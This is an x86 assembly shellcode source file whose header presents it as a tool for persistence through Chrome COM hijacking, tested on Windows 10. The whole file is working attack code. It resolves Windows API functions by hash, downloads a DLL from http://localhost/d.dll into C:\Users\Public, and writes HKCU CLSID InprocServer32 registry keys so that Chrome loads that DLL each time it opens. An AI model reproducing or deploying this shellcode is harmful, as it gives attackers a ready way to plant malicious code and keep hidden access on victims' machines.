; x86 Chrome COM Hijacking shellcode for persistence (Size: 541 bytes)
; Downloads a DLL from http://localhost/d.dll and saves it to C:\Users\Public\d.dll
; Creates registry keys in the HKCU hive to run the DLL every time Chrome is opened
; This shellcode was tested on: Microsoft Windows 10 Pro Version 10.0.19042 Build 19042 (64 bit)


start:
  mov ebp, esp                 ;  Make some space on the stack
  add esp, 0xfffff9f0          ;  by adding a negative number

find_kernel32_dll:
  xor ecx, ecx                 ;  ECX = 0x0
  mov esi, fs:[ecx+0x30]       ;  ESI = &(PEB) ([FS:0x30])
  mov esi, [esi+0x0C]          ;  ESI = PEB->Ldr
  mov esi, [esi+0x1C]          ;  ESI = PEB->Ldr.InInitOrder

next:
  mov ebx, [esi+0x08]          ;  EBX = InInitOrder[X].base_address
  mov edi, [esi+0x20]          ;  EDI = InInitOrder[X].module_name
  mov esi, [esi]               ;  ESI = InInitOrder[X].flink (next)
  cmp [edi+24], cx             ;  Check if 24th byte in module_name is a string terminator
  jne next                     ;  If not, check the next module

find_function_jump:
  jmp find_function_make_pic   ;  Short jump to find_function_make_pic

find_function_save:
  pop esi                      ;  Save address of find_function in ESI
  mov [ebp+0x04], esi          ;  Save find_function address in stack
  jmp find_functions_kernel32  ;  Continue by jumping to the function after find_function

find_function_make_pic:
  call find_function_save      ;  Relative call to dynamically get address of find_function

find_function:
  pushad                       ;  Save all registers. DLL base addr is in EBX
  mov eax, [ebx+0x3c]          ;  Offset to PE Signature
  mov edi, [ebx+eax+0x78]      ;  Export Table Directory RVA
  add edi, ebx                 ;  Export Table Directory VMA
  mov ecx, [edi+0x18]          ;  NumberOfNames
  mov eax, [edi+0x20]          ;  AddressOfNames RVA
  add eax, ebx                 ;  AddressOfNames VMA
  mov [ebp-4], eax             ;  Save AddressOfNames VMA

find_function_loop:
  jecxz find_function_end      ;  End function if ECX is 0
  dec ecx                      ;  Decrement NumberOfNames
  mov eax, [ebp-4]             ;  AddressOfNames VMA
  mov esi, [eax+ecx*4]         ;  RVA of symbol name
  add esi, ebx                 ;  VMA of symbol name

compute_hash:
  xor eax, eax                 ;  EAX = 0x0
  cdq                          ;  EDX = 0x0
  cld                          ;  Clear direction

compute_hash_loop:
  lodsb                        ;  Load the next byte from ESI into AL
  test al, al                  ;  Check for null terminator
  jz compare_func              ;  Once null terminator is hit, jump to compare_func
  ror edx, 0xf                 ;  Rotate EDX 15 bits to the right
  add edx, eax                 ;  Add the new byte to EDX
  jmp compute_hash_loop        ;  Loop

compare_func:
  cmp edx, [esp+0x24]          ;  Compare the computed hash with the requested hash
  jnz find_function_loop       ;  If it does not match, jump back to find_function_loop
  mov edx, [edi+0x24]          ;  AddressOfNameOrdinals RVA
  add edx, ebx                 ;  AddressOfNameOrdinals VMA
  mov cx, [edx+2*ecx]          ;  Function ordinal
  mov edx, [edi+0x1c]          ;  AddressOfFunctions RVA
  add edx, ebx                 ;  AddressOfFunctions VMA
  mov eax, [edx+4*ecx]         ;  Function RVA
  add eax, ebx                 ;  Function VMA
  mov [esp+0x1c], eax          ;  Overwrite EAX from pushad

find_function_end:
  popad                        ;  Restore registers
  ret                          ;  Return from find_function

find_functions_kernel32:
  push 0x8ee05933              ;  TerminateProcess hash
  call dword ptr [ebp+0x04]    ;  Call find_function
  mov [ebp+0x10], eax          ;  Save TerminateProcess address
  push 0x583c436c              ;  LoadLibraryA hash
  call dword ptr [ebp+0x04]    ;  Call find_function
  mov [ebp+0x14], eax          ;  Save LoadLibraryA address

load_urlmon:
  xor eax, eax                 ;  EAX = 0x0
  mov ax, 0x6c6c               ;  EAX = 0x00006c6c
  push eax                     ;  Push ll with string terminator
  push 0x642e6e6f              ;  Push on.d
  push 0x6d6c7275              ;  Push urlm
  push esp                     ;  Push pointer to urlmon.dll string
  call dword ptr [ebp+0x14]    ;  Call LoadLibraryA

find_functions_urlmon:
  mov ebx, eax                 ;  EBX = urlmon.dll base address
  push 0x725e9d33              ;  URLDownloadToFileA hash
  call dword ptr [ebp+0x04]    ;  Call find_function
  mov [ebp+0x18], eax          ;  Save URLDownloadToFileA address

load_advapi32:
  xor eax, eax                 ;  EAX = 0x0
  push eax                     ;  Push null terminator for string
  push 0x6c6c642e              ;  Push .dll
  push 0x32336970              ;  Push pi32
  push 0x61766461              ;  Push adva
  push esp                     ;  Push pointer to advapi32.dll string
  call dword ptr [ebp+0x14]    ;  Call LoadLibraryA

find_functions_advapi32:
  mov ebx, eax                 ;  EBX = advapi32.dll base address
  push 0xca3539f4              ;  RegCreateKeyExA hash
  call dword ptr [ebp+0x04]    ;  Call find_function
  mov [ebp+0x1c], eax          ;  Save RegCreateKeyExA address
  push 0x7ea030f3              ;  RegSetValueExA hash
  call dword ptr [ebp+0x04]    ;  Call find_function
  mov [ebp+0x20], eax          ;  Save RegSetValueExA address
  push 0xfd53d2d5              ;  RegCloseKey hash
  call dword ptr [ebp+0x04]    ;  Call find_function
  mov [ebp+0x24], eax          ;  Save RegCloseKey address

;  URLDownloadToFileA(NULL, http://localhost/d.dll, C:\\Users\\Public\\d.dll, 0, NULL); 
call_urldownloadtofilea:
  xor eax, eax                 ;  EAX = 0x0
  mov ax, 0x6c6c               ;  EAX = 0x00006c6c
  push eax                     ;  Push ll with string terminator
  push 0x642e642f              ;  Push /d.d
  push 0x74736f68              ;  Push host
  push 0x6c61636f              ;  Push ocal
  push 0x6c2f2f3a              ;  Push ://l
  push 0x70747468              ;  Push http
  push esp                     ;  Get pointer to URL string
  pop edi                      ;  Save pointer in EDI
  xor eax, eax                 ;  EAX = 0x0
  mov al, 0x6c                 ;  EAX = 0x0000006c
  push eax                     ;  Push l with string terminator
  push 0x6c642e64              ;  Push d.dl
  push 0x5c63696c              ;  Push lic\
  push 0x6275505c              ;  Push \Pub
  push 0x73726573              ;  Push sers
  push 0x555c3a43              ;  Push C:\U
  push esp                     ;  Get pointer to URL string
  pop esi                      ;  Save pointer in ESI
  xor eax, eax                 ;  EAX = 0x0
  push eax                     ;  Push lpfnCB = null
  push eax                     ;  Push dwReserved = 0
  push esi                     ;  Push szFileName = C:\Users\Public\d.dll
  push edi                     ;  Push szURL = http://localhost/d.dll
  push eax                     ;  Push pCaller = null
  call dword ptr [ebp+0x18]    ;  call URLDownloadToFileA

;  RegCreateKeyExA(HKEY_CURRENT_USER, SOFTWARE\\Classes\\CLSID\\{A4B544A1-438D-4B41-9325-869523E2D6C7}\\InprocServer32, 0, NULL, 0, KEY_ALL_ACCESS|KEY_WOW64_64KEY, NULL, &inprocservkey, NULL); 
call_regcreatekeyexa:
  xor eax, eax                 ;  EAX = 0x0
  push eax                     ;  Push null DWORD to stack for the new registry key
  push esp                     ;  Create a pointer for the key
  pop edi                      ;  Store the pointer in EDI
  push eax                     ;  Push string terminator for the new reg key name
  push 0x32337265              ;  Push er32
  push 0x76726553              ;  Push Serv
  push 0x636f7270              ;  Push proc
  push 0x6e495c7d              ;  Push }\In
  push 0x37433644              ;  Push D6C7
  push 0x32453332              ;  Push 23E2
  push 0x35393638              ;  Push 8695
  push 0x2d353233              ;  Push 325-
  push 0x392d3134              ;  Push 41-9
  push 0x42342d44              ;  Push D-4B
  push 0x3833342d              ;  Push -438
  push 0x31413434              ;  Push 44A1
  push 0x35423441              ;  Push A4B5
  push 0x7b5c4449              ;  Push ID\{
  push 0x534c435c              ;  Push \CLS
  push 0x73657373              ;  Push sses
  push 0x616c435c              ;  Push \Cla
  push 0x45524157              ;  Push WARE
  push 0x54464f53              ;  Push SOFT
  push esp                     ;  Create a pointer to the regkey name string
  pop ecx                      ;  Store the pointer in EBX
  push eax                     ;  Push lpdwDisposition = null
  push edi                     ;  Push phkResult = pointer to new key
  push eax                     ;  Push lpSecurityAttributes = null
  mov ebx, 0x0f013fff          ;  Avoid null bytes by adding an extra 0xff at the end
  shr ebx, 0x8                 ;  Shift EBX right 2 bytes;  EBX = 0x0f013f
  push ebx                     ;  Push samDesired = KEY_ALL_ACCESS|KEY_WOW64_64KEY
  push eax                     ;  Push dwOptions = 0x0
  push eax                     ;  Push lpClass = null
  push eax                     ;  Push Reserved = 0x0
  push ecx                     ;  Push lpSubKey = key name string
  mov eax, 0x7fffffff          ;  Avoid null bytes with negative number
  neg eax                      ;  Negate EAX;  EAX = 0x80000001
  push eax                     ;  Push hKey = HKEY_CURRENT_USER
  call dword ptr [ebp+0x1c]    ;  Call RegCreateKeyExA

;  RegSetValueExA(inprocservkey, NULL, 0, REG_SZ, dll_buf, sizeof(dll_buf)); 
call_regsetvalueexa_defaultkey:
  mov eax, 0xffffffeb          ;  EAX = 0xffffffeb
  neg eax                      ;  Negate EAX;  EAX = 0x15
  push eax                     ;  Push cbData = 0x15
  push esi                     ;  Push lpData = C:\Users\Public\d.dll
  xor eax, eax                 ;  EAX = 0x0
  inc eax                      ;  EAX = 0x1
  push eax                     ;  Push dwType = REG_SZ
  dec eax                      ;  EAX = 0x0
  push eax                     ;  Push Reserved = 0x0
  push eax                     ;  Push lpValueName = null
  mov edi, [edi]               ;  Get reg key handle through dereferencing its address
  push edi                     ;  Push hKey = regkey handle
  call dword ptr [ebp+0x20]    ;  Call RegSetValueExA

;  RegSetValueExA(inprocservkey, ThreadingModel, 0, REG_SZ, thread_buf, sizeof(thread_buf));
call_regsetvalueexa_threadkey:
  mov eax, 0xffffff8c          ;  EAX = 0xffffff8c
  neg eax                      ;  Negate EAX;  EAX = 0x74
  push eax                     ;  Push t with string terminator
  push 0x6e656d74              ;  Push tmen
  push 0x72617041              ;  Push Apar
  push esp                     ;  Create pointer to Apartment
  pop ebx                      ;  Save pointer in EBX
  mov ax, 0x6c65               ;  EAX = 0x00006c65
  push eax                     ;  Push el with string terminator
  push 0x646f4d67              ;  Push gMod
  push 0x6e696461              ;  Push adin
  push 0x65726854              ;  Push Thre
  push esp                     ;  Create pointer to ThreadingModel
  pop ecx                      ;  Save pointer in ECX
  mov eax, 0xfffffff6          ;  EAX = 0xfffffff6
  neg eax                      ;  Negate EAX;  EAX = 0xa
  push eax                     ;  Push cbData = 0x0a
  push ebx                     ;  Push lpData = Apartment
  mov al, 0x1                  ;  EAX = 0x00000001
  push eax                     ;  Push dwType = REG_SZ
  dec eax                      ;  EAX = 0x0
  push eax                     ;  Push Reserved = 0
  push ecx                     ;  Push lpValueName = ThreadingModel
  push edi                     ;  Push hKey = reg key handle
  call dword ptr [ebp+0x20]    ;  Call RegSetValueExA

;  RegCloseKey(inprocservkey); 
call_regclosekey:
  push edi                     ;  Push hKey = reg key handle
  call dword ptr [ebp+0x24]    ;  Call RegCloseKey

;  TerminateProcess(-1, 0); 
call_terminateprocess:
  xor ecx, ecx                 ;  ECX = 0
  push ecx                     ;  Push uExitCode = 0
  push 0xffffffff              ;  Push hProcess = current process
  call dword ptr [ebp+0x10]    ;  Call TerminateProcess
